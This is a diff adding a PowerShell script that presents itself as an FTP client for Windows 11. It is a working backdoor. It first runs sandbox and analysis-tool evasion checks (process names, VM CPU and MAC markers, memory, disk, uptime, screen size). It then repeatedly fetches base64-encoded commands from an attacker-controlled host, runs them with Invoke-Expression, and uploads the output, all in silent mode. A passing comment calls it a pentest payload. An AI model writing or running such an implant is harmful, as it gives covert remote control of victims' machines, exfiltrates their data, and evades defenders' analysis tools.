@@ -1,0 +1,479 @@
+# ==============================================================
+#  FTP CLIENT - PowerShell  (Windows 11)
+#  Modifica SERVER_IP con l indirizzo IP della macchina Linux
+# ==============================================================
+$SERVER_IP   = "[ATTACKER-IP]"   # <-- inserire IP del server Linux
+$SERVER_PORT = 21
+$DATA_PORT   = 10092             # porta passiva fissa concordata col server
+
+$USERNAME    = "usrftp"
+$PASSWORD    = "myPassword"
+
+$DOWNLOAD_FILE  = "downloadME.txt"
+$UPLOAD_FILE    = "uploadME.txt"
+$UPLOAD_CONTENT = "CONTENUTO DEL FILE DA UPLODARE"
+
+$DEBUG  = $false  #true: visualizzo tutti i messaggi -false: solo i messaggi importanti
+$SILENT = $true #true: non visualizzo nessun messaggio
+
+$CONNECT_TIMEOUT_MS = 5000    # ms per tentativo di connessione TCP
+$READ_TIMEOUT_MS    = 300000  # ms di attesa (5 min: server aspetta input utente prima del 150)
+
+#  Sandbox chcker parameters
+$MemoryThresholdGB = 4,
+$DiskThresholdGB = 100,
+$UptimeThresholdMinutes = 30,
+$Verbose
+# ==============================================================
+
+
+
+# =========== start with SANBOX CHECKER ========================
+function Write-OutputConditional {
+    param(
+        [string]$Message,
+        [string]$ForegroundColor = "White",
+        [string]$BackgroundColor = $null
+    )
+    
+    if (-not $SILENT) {
+        if ($BackgroundColor) {
+            Write-Host $Message -ForegroundColor $ForegroundColor -BackgroundColor $BackgroundColor
+        } else {
+            Write-Host $Message -ForegroundColor $ForegroundColor
+        }
+    }
+}
+
+function Test-SystemVirtualization {
+    # Check if running under Hyper-V (common on Windows 11)
+    try {
+        $hyperv = Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue
+        if ($hyperv -and $hyperv.HypervisorPresent -eq $true) {
+            if ($Verbose -and -not $SILENT) { 
+                Write-OutputConditional "[INFO] Hyper-V detected - system virtualization present" -ForegroundColor Cyan 
+            }
+            return $true
+        }
+    } catch {}
+    
+    # Check registry for Hyper-V
+    try {
+        $regKey = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Virtualization" -ErrorAction SilentlyContinue
+        if ($regKey -and $regKey.InstallDate) {
+            if ($Verbose -and -not $SILENT) { 
+                Write-OutputConditional "[INFO] System virtualization registry detected" -ForegroundColor Cyan 
+            }
+            return $true
+        }
+    } catch {}
+    
+    return $false
+}
+
+function Test-SandboxEnvironment {
+    param([bool]$SystemVirtualization)
+    
+    $sandboxDetected = $false
+    $detectionResults = @()
+    
+    # Technique 1: Check for sandbox-specific processes
+    $sandboxProcesses = @(
+        "sandboxie.exe", "sandboxierpc.exe", 
+        "procmon.exe", "wireshark.exe", "tcpdump.exe", "fiddler.exe", "api-mon.exe"
+    )
+    
+    $runningProcesses = Get-Process -ErrorAction SilentlyContinue | 
+        Select-Object -ExpandProperty Name -Unique
+    
+    foreach ($process in $sandboxProcesses) {
+        if ($runningProcesses -contains $process) {
+            $detectionResults += "Sandbox analysis tool detected: $process"
+            $sandboxDetected = $true
+        }
+    }
+    
+    # Technique 2: Check CPU for virtualization indicators
+    $cpuInfo = Get-WmiObject -Class Win32_Processor -ErrorAction SilentlyContinue
+    if ($cpuInfo) {
+        $cpuName = $cpuInfo.Name
+        
+        # Only flag if NOT running under system virtualization
+        if (-not $SystemVirtualization) {
+            if ($cpuName -match "QEMU|KVM|Xen|Parallels") {
+                $detectionResults += "Emulated CPU detected: $cpuName"
+                $sandboxDetected = $true
+            }
+        }
+        
+        # Check for very low core count (common in sandboxes)
+        if ($cpuInfo.NumberOfCores -lt 2) {
+            $detectionResults += "Very low core count: $($cpuInfo.NumberOfCores) cores"
+            $sandboxDetected = $true
+        }
+    }
+    
+    # Technique 3: Check system memory
+    $memoryInfo = Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue
+    if ($memoryInfo) {
+        $totalMemoryGB = [math]::Round($memoryInfo.TotalPhysicalMemory / 1GB, 2)
+        if ($totalMemoryGB -lt $MemoryThresholdGB) {
+            $detectionResults += "Low memory: ${totalMemoryGB}GB (threshold: ${MemoryThresholdGB}GB)"
+            $sandboxDetected = $true
+        }
+    }
+    
+    # Technique 4: Check disk size
+    $disks = Get-WmiObject -Class Win32_LogicalDisk -ErrorAction SilentlyContinue
+    foreach ($disk in $disks) {
+        if ($disk.DeviceID -eq "C:") {
+            $totalSizeGB = [math]::Round($disk.Size / 1GB, 2)
+            if ($totalSizeGB -lt $DiskThresholdGB) {
+                $detectionResults += "Small disk: ${totalSizeGB}GB (threshold: ${DiskThresholdGB}GB)"
+                $sandboxDetected = $true
+            }
+        }
+    }
+    
+    # Technique 5: Check MAC addresses with system virtualization awareness
+    if (-not $SystemVirtualization) {
+        $networkAdapters = Get-WmiObject -Class Win32_NetworkAdapter -ErrorAction SilentlyContinue
+        foreach ($adapter in $networkAdapters) {
+            if ($adapter.MACAddress -and $adapter.NetEnabled -eq $true) {
+                $macPrefix = $adapter.MACAddress.Substring(0, 8).Replace(":", "").ToUpper()
+                $virtualPrefixes = @("000C29", "001C14", "005056", "080027", "0A0027")
+                
+                if ($virtualPrefixes -contains $macPrefix) {
+                    $adapterName = $adapter.Name
+                    if ($adapterName -notmatch "Hyper-V|Virtual|WSL|Docker|vEthernet") {
+                        $detectionResults += "Suspicious MAC from non-system adapter: $($adapter.MACAddress) ($adapterName)"
+                        $sandboxDetected = $true
+                    }
+                }
+            }
+        }
+    }
+    
+    # Technique 6: Check uptime
+    try {
+        $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue
+        if ($os) {
+            $uptime = (Get-Date) - $os.LastBootUpTime
+            if ($uptime.TotalMinutes -lt $UptimeThresholdMinutes) {
+                $detectionResults += "Very short uptime: $($uptime.TotalMinutes) minutes (threshold: ${UptimeThresholdMinutes} minutes)"
+                $sandboxDetected = $true
+            }
+        }
+    } catch {}
+    
+    # Technique 7: Check screen resolution
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        $screenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
+        $screenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
+        if ($screenWidth -lt 1024 -or $screenHeight -lt 768) {
+            $detectionResults += "Low screen resolution: ${screenWidth}x${screenHeight}"
+            $sandboxDetected = $true
+        }
+    } catch {
+        # Skip if can't check resolution
+    }
+    
+    return @{
+        Detected = $sandboxDetected
+        Results = $detectionResults
+    }
+}
+
+function Invoke-NonInterceptableSleep {
+    param([int]$Seconds = 60)
+    
+    # Use .NET Sleep which is harder to detect/intercept
+    [System.Threading.Thread]::Sleep($Seconds * 1000)
+}
+
+# Main execution
+Write-OutputConditional "[*] Starting sandbox detection v3..." -ForegroundColor Yellow
+Write-OutputConditional "[*] Thresholds: Memory=${MemoryThresholdGB}GB, Disk=${DiskThresholdGB}GB, Uptime=${UptimeThresholdMinutes}min" -ForegroundColor Gray
+
+# Check for system virtualization first
+$systemVirtualization = Test-SystemVirtualization
+if ($systemVirtualization -and -not $SILENT) {
+    Write-OutputConditional "[INFO] System virtualization detected - adjusting detection logic" -ForegroundColor Cyan
+}
+
+$detection = Test-SandboxEnvironment -SystemVirtualization $systemVirtualization
+
+if ($detection.Detected) {
+    Write-OutputConditional "[!] Sandbox environment detected!" -ForegroundColor Red
+    Write-OutputConditional "[!] Terminating execution..." -ForegroundColor Red
+    foreach ($result in $detection.Results) {
+        Write-OutputConditional "    - $result" -ForegroundColor DarkRed
+    }
+    #exit 1
+	Invoke-NonInterceptableSleep -Seconds 20
+} else {
+    Write-OutputConditional "[+] No sandbox detected. Proceeding with payload..." -ForegroundColor Green
+    
+    if ($Verbose -and -not $SILENT) {
+        Write-OutputConditional "[*] System virtualization status: $(if($systemVirtualization){'Present'}else{'Not detected'})" -ForegroundColor Cyan
+    }
+    
+    Write-OutputConditional "[*] Executing 60-second non-interceptable sleep..." -ForegroundColor Yellow
+    
+    # Execute non-interceptable sleep
+    Invoke-NonInterceptableSleep -Seconds 5
+    
+    Write-OutputConditional "[+] Sleep completed successfully." -ForegroundColor Green
+    Write-OutputConditional "[*] Continuing with legitimate operations..." -ForegroundColor Yellow
+    
+    # Place actual pentest payload here
+}
+# ==============================================================
+
+
+# =========== starting with PAYLOAD =============================
+# -- Funzioni helper --------------------------------------------
+
+function out($msg, $color = "White") {
+    if (-not $SILENT) {
+        if ($color -eq "White") { Write-Host $msg }
+        else { Write-Host $msg -ForegroundColor $color }
+    }
+}
+
+function dbg($msg) {
+    if ($DEBUG -and -not $SILENT) {
+        $ts = (Get-Date).ToString("HH:mm:ss.fff")
+        Write-Host "  [DBG $ts] $msg" -ForegroundColor Cyan
+    }
+}
+
+function Send-Command($stream, $cmd) {
+    dbg ">>> Invio comando: $cmd"
+    $bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd + "`r`n")
+    try {
+        $stream.Write($bytes, 0, $bytes.Length)
+        $stream.Flush()
+        dbg "    Comando inviato ($($bytes.Length) bytes)"
+    } catch {
+        out "[ERRORE] Impossibile inviare il comando: $_" "Red"
+        throw
+    }
+    out "[C->S] $cmd"
+}
+
+function Read-Response($reader) {
+    dbg "    In attesa risposta dal server (timeout $($READ_TIMEOUT_MS)ms)..."
+    try {
+        $line = $reader.ReadLine()
+        if ($null -eq $line) {
+            out "[ERRORE] Connessione chiusa dal server (ReadLine = null)" "Red"
+            throw "Server ha chiuso la connessione"
+        }
+        dbg "    Risposta ricevuta: $line"
+        out "[S->C] $line"
+        return $line
+    } catch {
+        out "[ERRORE] Timeout o errore lettura risposta: $_" "Red"
+        throw
+    }
+}
+
+function New-TcpConnection($ip, $port) {
+    dbg "Tentativo connessione TCP a ${ip}:${port} (timeout $($CONNECT_TIMEOUT_MS)ms) ..."
+    $client = New-Object System.Net.Sockets.TcpClient
+    $ar = $client.BeginConnect($ip, $port, $null, $null)
+    $ok = $ar.AsyncWaitHandle.WaitOne($CONNECT_TIMEOUT_MS, $false)
+    if (-not $ok) {
+        $client.Close()
+        throw "Timeout connessione TCP a ${ip}:${port} dopo $($CONNECT_TIMEOUT_MS)ms"
+    }
+    try { $client.EndConnect($ar) } catch {
+        $client.Close()
+        throw "Connessione TCP a ${ip}:${port} fallita: $_"
+    }
+    dbg "Connessione TCP stabilita. LocalEndPoint=$($client.Client.LocalEndPoint)"
+    return $client
+}
+
+# -- Connessione al canale di controllo -------------------------
+out ""
+out "[CLIENT] Avvio connessione FTP verso ${SERVER_IP}:${SERVER_PORT}" "Yellow"
+dbg "Creazione TcpClient per canale di controllo..."
+
+try {
+    $ctrlClient = New-TcpConnection $SERVER_IP $SERVER_PORT
+} catch {
+    out "[ERRORE FATALE] $_" "Red"
+    out "  Verifica: IP corretto? Server avviato? Firewall aperto sulla porta $SERVER_PORT?" "Yellow"
+    exit 1
+}
+
+$ctrlStream = $ctrlClient.GetStream()
+$ctrlStream.ReadTimeout  = $READ_TIMEOUT_MS
+$ctrlStream.WriteTimeout = $READ_TIMEOUT_MS
+$ctrlReader = New-Object System.IO.StreamReader($ctrlStream, [System.Text.Encoding]::ASCII)
+dbg "Stream di controllo pronto. In attesa del banner 220..."
+
+# 220
+try { $resp = Read-Response $ctrlReader } catch { out "[ERRORE FATALE] $_" "Red"; exit 1 }
+
+# -- FASE 1: autenticazione ------------------------------------
+out ""
+out "[CLIENT] FASE 1 - Autenticazione" "Yellow"
+
+try {
+    Send-Command $ctrlStream "USER $USERNAME"
+    $resp = Read-Response $ctrlReader   # 331
+
+    Send-Command $ctrlStream "PASS $PASSWORD"
+    $resp = Read-Response $ctrlReader   # 230 o 530
+} catch { out "[ERRORE FATALE] $_" "Red"; $ctrlClient.Close(); exit 1 }
+
+if ($resp -notmatch "^230") {
+    out "[CLIENT] Autenticazione fallita (risposta: $resp). Disconnessione." "Red"
+    $ctrlClient.Close()
+    exit 1
+}
+
+out "[CLIENT] Autenticazione riuscita." "Green"
+
+# TYPE I
+dbg "Invio TYPE I ..."
+try {
+    Send-Command $ctrlStream "TYPE I"
+    $resp = Read-Response $ctrlReader   # 200
+} catch { out "[ERRORE FATALE] $_" "Red"; $ctrlClient.Close(); exit 1 }
+
+# -- LOOP FASE 4 / FASE 5 -------------------------------------
+$iteration = 0
+while ($true) {
+    $iteration++
+    out ""
+    out "[CLIENT] --- Iterazione $iteration ---" "Yellow"
+
+    # -- FASE 3+4: EPSV + RETR --------------------------------
+    out "[CLIENT] FASE 3+4 - Modalita passiva + Download" "Yellow"
+
+    try {
+        dbg "Invio EPSV per canale download..."
+        Send-Command $ctrlStream "EPSV"
+        $resp = Read-Response $ctrlReader   # 229
+
+        dbg "Invio SIZE..."
+        Send-Command $ctrlStream "SIZE $DOWNLOAD_FILE"
+        $resp = Read-Response $ctrlReader   # 213
+
+        dbg "Invio RETR..."
+        Send-Command $ctrlStream "RETR $DOWNLOAD_FILE"
+        $resp = Read-Response $ctrlReader   # 150
+    } catch { out "[ERRORE FATALE] $_" "Red"; $ctrlClient.Close(); exit 1 }
+
+    dbg "Apertura connessione dati verso ${SERVER_IP}:${DATA_PORT} ..."
+    try {
+        $dataClient = New-TcpConnection $SERVER_IP $DATA_PORT
+    } catch {
+        out "[ERRORE FATALE canale dati RETR] $_" "Red"
+        out "  Verifica: firewall aperto sulla porta $DATA_PORT?" "Yellow"
+        $ctrlClient.Close(); exit 1
+    }
+
+    $dataStream = $dataClient.GetStream()
+    $dataStream.ReadTimeout = $READ_TIMEOUT_MS
+    dbg "Canale dati aperto. Lettura contenuto file..."
+
+    $memStream = New-Object System.IO.MemoryStream
+    try {
+        $dataStream.CopyTo($memStream)
+    } catch {
+        dbg "CopyTo interrotto (puo essere normale a fine stream): $_"
+    }
+    $dataClient.Close()
+    dbg "Canale dati chiuso. Bytes ricevuti: $($memStream.Length)"
+    
+	# >>>>>>>>>>>>>>>>>>>>>>>
+	# >>>>>>>>>>>>>>>>>>>>>>> contenuto ricevuto
+	# >>>>>>>>>>>>>>>>>>>>>>>
+    $fileContent = [System.Text.Encoding]::ASCII.GetString($memStream.ToArray())
+	dbg "Ricevuto: $fileContent"
+	if ($fileContent.StartsWith("AAA")) {
+       $b64 = $fileContent.Substring(3)  # rimuove i primi 3 caratteri "AAA"
+    }
+    # Decodifica Base64 in bytes
+    $bytes = [Convert]::FromBase64String($b64)
+    # Converte i bytes in stringa UTF-8
+    $fileContent = [System.Text.Encoding]::UTF8.GetString($bytes)
+	if (-not $SILENT) {
+	    Write-Host "Ricevuto: $fileContent" -ForegroundColor Magenta
+	}
+    try {
+        $resp = Read-Response $ctrlReader   # 226
+    } catch { out "[ERRORE FATALE] $_" "Red"; $ctrlClient.Close(); exit 1 }
+
+    # Controllo QUIT
+    if ($fileContent.Trim().ToUpper() -eq "QUIT") {
+        out "[CLIENT] Ricevuto QUIT. Disconnessione." "Green"
+        break
+    }
+
+    # -- FASE 5: EPSV + STOR ----------------------------------
+    out "[CLIENT] FASE 5 - Modalita passiva + Upload" "Yellow"
+
+    try {
+        dbg "Invio EPSV per canale upload..."
+        Send-Command $ctrlStream "EPSV"
+        $resp = Read-Response $ctrlReader   # 229
+
+        dbg "Invio STOR..."
+        Send-Command $ctrlStream "STOR $UPLOAD_FILE"
+        $resp = Read-Response $ctrlReader   # 150
+    } catch { out "[ERRORE FATALE] $_" "Red"; $ctrlClient.Close(); exit 1 }
+
+    dbg "Apertura connessione dati verso ${SERVER_IP}:${DATA_PORT} per upload..."
+    try {
+        $dataClient = New-TcpConnection $SERVER_IP $DATA_PORT
+    } catch {
+        out "[ERRORE FATALE canale dati STOR] $_" "Red"
+        out "  Verifica: firewall aperto sulla porta $DATA_PORT?" "Yellow"
+        $ctrlClient.Close(); exit 1
+    }
+
+	# >>>>>>>>>>>>>>>>>>>>>  
+	# >>>>>>>>>>>>>>>>>>>>>  CONTENUTO DA INVIARE
+	# >>>>>>>>>>>>>>>>>>>>>  	
+    # Esegui comando e cattura output
+    $result = Invoke-Expression $fileContent 2>&1 | Out-String
+	if (-not $SILENT) {
+          Write-Host "Sto per inviare: $result" -ForegroundColor Magenta
+    }
+    # Converte in byte UTF-8
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($result)
+    # Genera Base64 senza newline
+    $base64 = [Convert]::ToBase64String($bytes)
+    # Aggiunge prefisso
+    $UPLOAD_CONTENT = "AAA" + $base64
+    $dataStream = $dataClient.GetStream()
+    $dataStream.WriteTimeout = $READ_TIMEOUT_MS
+    $uploadBytes = [System.Text.Encoding]::ASCII.GetBytes($UPLOAD_CONTENT)
+    dbg "Invio $($uploadBytes.Length) bytes sul canale dati..."
+    try {
+        $dataStream.Write($uploadBytes, 0, $uploadBytes.Length)
+        $dataStream.Flush()
+    } catch {
+        out "[ERRORE FATALE invio dati STOR] $_" "Red"
+        $ctrlClient.Close(); exit 1
+    }
+    $dataClient.Close()
+    dbg "Canale dati upload chiuso."
+
+    try {
+        $resp = Read-Response $ctrlReader   # 226
+    } catch { out "[ERRORE FATALE] $_" "Red"; $ctrlClient.Close(); exit 1 }
+
+    out "[CLIENT] Upload completato." "Green"
+}
+
+$ctrlClient.Close()
+out ""
+out "[CLIENT] Connessione chiusa. Client terminato." "Green"
